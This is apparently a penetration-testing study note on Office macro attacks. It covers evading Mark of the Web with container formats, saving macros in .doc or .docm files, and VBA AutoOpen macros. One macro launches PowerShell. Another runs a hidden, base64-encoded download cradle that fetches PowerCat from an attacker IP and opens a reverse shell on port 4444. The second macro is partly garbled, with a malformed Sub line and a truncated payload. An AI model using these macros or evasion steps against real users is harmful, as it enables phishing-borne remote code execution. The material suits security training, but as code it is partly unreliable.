# Microsoft Office



## Mark of the Web (MOTW)
If we successfully manage to deliver the Office document to our target via email or download link, the file will be tagged with the Mark of the Web (MOTW) and will open in Protected View (which disables all editing and modification settings in the document and blocks the execution of macros or embedded objects).

MOTW is not added to files on FAT32-formatted devices.

It is possible to avoid getting a file flagged with MOTW by providing it in container file formats like 7zip, ISO, or IMG.




## Macros

Macros are one of the oldest and best-known client-side attack vectors.

- < https://support.office.com/en-us/article/Create-or-run-a-macro-C6B99036-905C-49A6-818A- DFB98B7C3C9C>

- <https://docs.microsoft.com/en-us/office/vba/api/overview/>

Macros can be written from scratch in Visual Basic for Applications (VBA), which is a powerful scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications.





### Filetype
Save the file in the `.doc` format. This is important because the newer `.docx` file type cannot save macros without attaching a containing template. This means that we can run macros within `.docx` files but we can't embed or save the macro in the document. In other words, the macro is not persistent. Alternatively, we could also use the `.docm` file type for our embedded macro.




### PoC

This VBA code just opens PowerShell:
```
Sub AutoOpen()
	MyMacro
End Sub
Sub Document_Open()
	MyMacro
End Sub
Sub MyMacro()
	CreateObject("Wscript.Shell").Run "powershell"
End Sub
```




### Reverse shell with PowerCat

We'll use a base64-encoded PowerShell download cradle to download PowerCat and start the reverse shell.

The encoded PowerShell command will be declared as a String in VBA.

We should note that VBA has a 255-character limit for literal strings and therefore, we can't just embed the base64-encoded PowerShell commands as a single string. This restriction does not apply to strings stored in variables, so we can split the commands into multiple lines (stored in strings) and concatenate them.



Declare a string variable named `Str` with the `Dim` keyword, which we'll use to store our PowerShell download cradle and the command to create a reverse shell with PowerCat.

`Dim` stands for Dimension.
It is a keyword used to declare and allocate storage space for variables.
When you use `Dim`, you are essentially telling the compiler to create a variable of a certain type and, optionally, initialize it.


```
' PowerShell command to download cradle and PowerCat reverse shell 
' IEX(New-Object System.Net.WebClient).DownloadString('http://[ATTACKER IP]/powercat.ps1');powercat -c [ATTACKER IP] -p 4444 -e powershell



SubEndAutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	Dim Str As String
	
	Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
		Str = Str + ""

	CreateObject("Wscript.Shell").Run Str
End Sub
```















